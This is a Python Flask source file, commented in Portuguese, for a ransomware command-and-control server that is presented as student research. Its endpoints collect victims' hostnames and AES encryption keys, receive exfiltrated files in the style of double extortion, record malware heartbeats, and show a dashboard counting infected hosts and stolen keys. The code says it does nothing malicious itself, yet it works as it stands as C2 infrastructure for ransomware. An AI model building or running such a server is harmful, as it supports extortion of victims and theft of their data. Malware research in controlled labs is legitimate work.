"""
c2_server.py — Servidor C2 de pesquisa (Command & Control fake).

Recebe as chamadas HTTP do ransomware gerado pelo pipeline e registra
tudo para análise dos experimentos. NÃO faz nenhuma ação maliciosa real
— apenas coleta e exibe as métricas para a Iniciação Científica.

Endpoints:
    POST /collect        → recebe hostname + chave AES do ransomware
    POST /exfil          → recebe arquivos exfiltrados (REvil-like)
    GET  /               → dashboard HTML com métricas em tempo real
    GET  /api/events     → JSON com todos os eventos registrados
    GET  /api/stats      → JSON com estatísticas resumidas

Uso:
    pip install flask
    python c2_server.py                   # escuta em 0.0.0.0:8080
    python c2_server.py --port 9090       # porta customizada
    python c2_server.py --host 127.0.0.1  # só loopback
"""

import argparse
import json
import os
import sys
from datetime import datetime
from pathlib import Path

try:
    from flask import Flask, request, jsonify, Response
except ImportError:
    print("[ERRO] Flask não instalado. Execute: pip install flask")
    sys.exit(1)

# ── Configuração ───────────────────────────────────────────────────────────────

app = Flask(__name__)
app.config["JSON_SORT_KEYS"] = False

LOG_FILE = Path("c2_events.json")   # persistência simples em JSON

# Banco de dados em memória (também persiste em c2_events.json)
_events: list[dict] = []

# Carrega eventos anteriores se o arquivo existir
if LOG_FILE.exists():
    try:
        _events = json.loads(LOG_FILE.read_text(encoding="utf-8"))
    except Exception:
        _events = []


# ── Persistência ───────────────────────────────────────────────────────────────

def _save():
    """Salva todos os eventos no arquivo JSON."""
    LOG_FILE.write_text(json.dumps(_events, indent=2, ensure_ascii=False), encoding="utf-8")


def _register(event_type: str, data: dict) -> dict:
    """Registra um evento com timestamp e retorna o evento completo."""
    event = {
        "id":        len(_events) + 1,
        "timestamp": datetime.now().isoformat(timespec="seconds"),
        "type":      event_type,
        "source_ip": request.remote_addr,
        **data,
    }
    _events.append(event)
    _save()
    print(f"  [{event['timestamp']}] [{event_type}] IP={event['source_ip']} | {data}")
    return event


# ── Endpoints do ransomware ────────────────────────────────────────────────────

@app.route("/collect", methods=["POST"])
def collect():
    """
    Recebe a chave AES + hostname do ransomware (WannaCry-like, Locky-like).

    Payload esperado:
        {"hostname": "DESKTOP-XYZ", "aes_key": "<base64>"}
    """
    try:
        payload = request.get_json(force=True, silent=True) or {}
        hostname = payload.get("hostname", "unknown")
        aes_key  = payload.get("aes_key",  "N/A")

        event = _register("KEY_RECEIVED", {
            "hostname": hostname,
            "aes_key":  aes_key,
            "key_len":  len(aes_key),
        })

        return jsonify({"status": "ok", "event_id": event["id"]}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/exfil", methods=["POST"])
def exfil():
    """
    Recebe dados exfiltrados (REvil-like double extortion).

    Aceita multipart/form-data com arquivo ou JSON com metadados.
    """
    try:
        # Arquivo enviado via multipart
        if request.files:
            for fname, fobj in request.files.items():
                size = len(fobj.read())
                event = _register("FILE_EXFILTRATED", {
                    "filename": fname,
                    "size_bytes": size,
                })
            return jsonify({"status": "ok", "files_received": len(request.files)}), 200

        # Metadados via JSON
        payload = request.get_json(force=True, silent=True) or {}
        event = _register("EXFIL_METADATA", {
            "data": payload,
        })
        return jsonify({"status": "ok", "event_id": event["id"]}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/ping", methods=["POST", "GET"])
def ping():
    """Heartbeat — registra que o malware está ativo na máquina."""
    payload = request.get_json(force=True, silent=True) or {}
    event = _register("HEARTBEAT", {
        "hostname": payload.get("hostname", "unknown"),
        "info":     payload.get("info", {}),
    })
    return jsonify({"status": "alive", "event_id": event["id"]}), 200


# ── API de análise ─────────────────────────────────────────────────────────────

@app.route("/api/events")
def api_events():
    """Retorna todos os eventos registrados."""
    return jsonify(_events)


@app.route("/api/stats")
def api_stats():
    """Retorna estatísticas resumidas dos experimentos."""
    hosts_infectados = {e["hostname"] for e in _events if "hostname" in e}
    chaves_recebidas = [e for e in _events if e["type"] == "KEY_RECEIVED"]
    arquivos_exfil   = [e for e in _events if e["type"] == "FILE_EXFILTRATED"]
    heartbeats       = [e for e in _events if e["type"] == "HEARTBEAT"]

    return jsonify({
        "total_eventos":       len(_events),
        "hosts_infectados":    len(hosts_infectados),
        "lista_hosts":         list(hosts_infectados),
        "chaves_recebidas":    len(chaves_recebidas),
        "arquivos_exfiltrados": len(arquivos_exfil),
        "heartbeats":          len(heartbeats),
        "primeiro_evento":     _events[0]["timestamp"]  if _events else None,
        "ultimo_evento":       _events[-1]["timestamp"] if _events else None,
    })


@app.route("/api/clear", methods=["POST"])
def api_clear():
    """Limpa todos os eventos (usar antes de um novo experimento)."""
    global _events
    _events = []
    _save()
    return jsonify({"status": "cleared"}), 200


# ── Dashboard HTML ─────────────────────────────────────────────────────────────

@app.route("/")
def dashboard():
    html = """<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="5">
<title>C2 Dashboard — Iniciação Científica</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Courier New', monospace; background: #0d1117; color: #c9d1d9; min-height: 100vh; }
  header { background: #161b22; border-bottom: 1px solid #30363d; padding: 16px 32px; display: flex; align-items: center; gap: 12px; }
  header h1 { font-size: 1.1rem; color: #f85149; letter-spacing: 2px; text-transform: uppercase; }
  header span { font-size: 0.75rem; color: #8b949e; margin-left: auto; }
  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; padding: 24px 32px; }
  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; }
  .card .label { font-size: 0.7rem; color: #8b949e; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
  .card .value { font-size: 2rem; font-weight: bold; }
  .card.red   .value { color: #f85149; }
  .card.yellow .value { color: #e3b341; }
  .card.green .value { color: #3fb950; }
  .card.blue  .value { color: #58a6ff; }
  .section { padding: 0 32px 32px; }
  .section h2 { font-size: 0.8rem; color: #8b949e; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 12px; border-bottom: 1px solid #30363d; padding-bottom: 8px; }
  table { width: 100%; border-collapse: collapse; font-size: 0.82rem; }
  th { text-align: left; padding: 8px 12px; color: #8b949e; font-weight: normal; border-bottom: 1px solid #30363d; }
  td { padding: 8px 12px; border-bottom: 1px solid #21262d; }
  td.type-KEY      { color: #f85149; }
  td.type-EXFIL    { color: #e3b341; }
  td.type-HEART    { color: #3fb950; }
  td.type-META     { color: #58a6ff; }
  .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: bold; }
  .badge-red    { background: #3d1f1e; color: #f85149; }
  .badge-yellow { background: #3d2e00; color: #e3b341; }
  .badge-green  { background: #1a3626; color: #3fb950; }
  .badge-blue   { background: #1e2d3d; color: #58a6ff; }
  .hint { font-size: 0.7rem; color: #484f58; margin-top: 16px; text-align: right; }
</style>
</head>
<body>
<header>
  <h1>⚠ C2 Research Dashboard</h1>
  <span id="ts">Atualiza a cada 5s</span>
</header>

<div class="grid" id="cards">
  <div class="card red">  <div class="label">Hosts Infectados</div><div class="value" id="v-hosts">—</div></div>
  <div class="card yellow"><div class="label">Chaves Recebidas</div><div class="value" id="v-keys">—</div></div>
  <div class="card blue"> <div class="label">Arquivos Exfiltrados</div><div class="value" id="v-exfil">—</div></div>
  <div class="card green"><div class="label">Total de Eventos</div><div class="value" id="v-total">—</div></div>
</div>

<div class="section">
  <h2>Log de Eventos</h2>
  <table>
    <thead><tr><th>#</th><th>Timestamp</th><th>Tipo</th><th>IP Origem</th><th>Detalhes</th></tr></thead>
    <tbody id="tbody"></tbody>
  </table>
  <p class="hint">Página atualiza automaticamente a cada 5 segundos.</p>
</div>

<script>
const TYPE_CLASS = {
  KEY_RECEIVED:     ['type-KEY',   'badge-red',    'CHAVE RECEBIDA'],
  FILE_EXFILTRATED: ['type-EXFIL', 'badge-yellow', 'ARQUIVO EXFILTRADO'],
  HEARTBEAT:        ['type-HEART', 'badge-green',  'HEARTBEAT'],
  EXFIL_METADATA:   ['type-META',  'badge-blue',   'METADATA'],
};

async function refresh() {
  const [stats, events] = await Promise.all([
    fetch('/api/stats').then(r => r.json()),
    fetch('/api/events').then(r => r.json()),
  ]);

  document.getElementById('v-hosts').textContent  = stats.hosts_infectados;
  document.getElementById('v-keys').textContent   = stats.chaves_recebidas;
  document.getElementById('v-exfil').textContent  = stats.arquivos_exfiltrados;
  document.getElementById('v-total').textContent  = stats.total_eventos;
  document.getElementById('ts').textContent       = 'Atualizado: ' + new Date().toLocaleTimeString('pt-BR');

  const tbody = document.getElementById('tbody');
  tbody.innerHTML = '';
  [...events].reverse().forEach(e => {
    const [cls, badge, label] = TYPE_CLASS[e.type] || ['', 'badge-blue', e.type];
    const details = Object.entries(e)
      .filter(([k]) => !['id','timestamp','type','source_ip'].includes(k))
      .map(([k,v]) => `<b>${k}</b>: ${typeof v === 'object' ? JSON.stringify(v) : v}`)
      .join(' | ');
    tbody.innerHTML += `<tr>
      <td>${e.id}</td>
      <td>${e.timestamp}</td>
      <td class="${cls}"><span class="badge ${badge}">${label}</span></td>
      <td>${e.source_ip}</td>
      <td style="color:#8b949e;font-size:0.78rem">${details}</td>
    </tr>`;
  });
}

refresh();
</script>
</body>
</html>"""
    return Response(html, mimetype="text/html")


# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Servidor C2 de pesquisa.")
    parser.add_argument("--host", default="0.0.0.0", help="Interface de escuta (padrão: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=8080, help="Porta (padrão: 8080)")
    args = parser.parse_args()

    print("\n" + "=" * 55)
    print("   C2 RESEARCH SERVER — INICIAÇÃO CIENTÍFICA")
    print("=" * 55)
    print(f"  Escutando em : http://{args.host}:{args.port}")
    print(f"  Dashboard    : http://localhost:{args.port}/")
    print(f"  Endpoints    : POST /collect  POST /exfil  GET /ping")
    print(f"  Log          : {LOG_FILE.resolve()}")
    print("=" * 55 + "\n")

    app.run(host=args.host, port=args.port, debug=False)


if __name__ == "__main__":
    main()
